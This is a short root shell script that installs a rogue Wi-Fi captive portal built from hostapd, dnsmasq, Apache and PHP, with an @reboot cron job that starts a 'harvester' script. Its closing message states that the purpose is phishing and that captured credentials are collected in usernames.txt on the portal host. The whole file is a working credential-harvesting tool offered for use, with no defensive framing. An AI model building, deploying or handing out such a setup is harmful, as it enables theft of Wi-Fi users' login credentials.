#!/bin/sh -e

if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root." 1>&2
   exit 1
fi

echo "Installing dependencies..."
apt-get install macchanger hostapd dnsmasq apache2 php

echo "Configuring components..."
cp -f hostapd.conf /etc/hostapd/
cp -f dnsmasq.conf /etc/
cp -Rf html /var/www/
chown -R www-data:www-data /var/www/html
chown root:www-data /var/www/html/.htaccess
cp -f ConPineHarvesterStart.sh /root/
crontab -l | { cat; echo "@reboot     sudo sleep 15 && sudo sh /root/ConPineHarvesterStart.sh &"; } | crontab -
chmod +x /root/ConPineHarvesterStart.sh
cp -f override.conf /etc/apache2/conf-available/
cd /etc/apache2/conf-enabled
ln -s ../conf-available/override.conf override.conf
cd /etc/apache2/mods-enabled
ln -s ../mods-available/rewrite.load rewrite.load

echo "Rogue captive portal installed. Reboot to start phishing. Credentials will be available here: http://10.1.1.1/usernames.txt"
exit 0
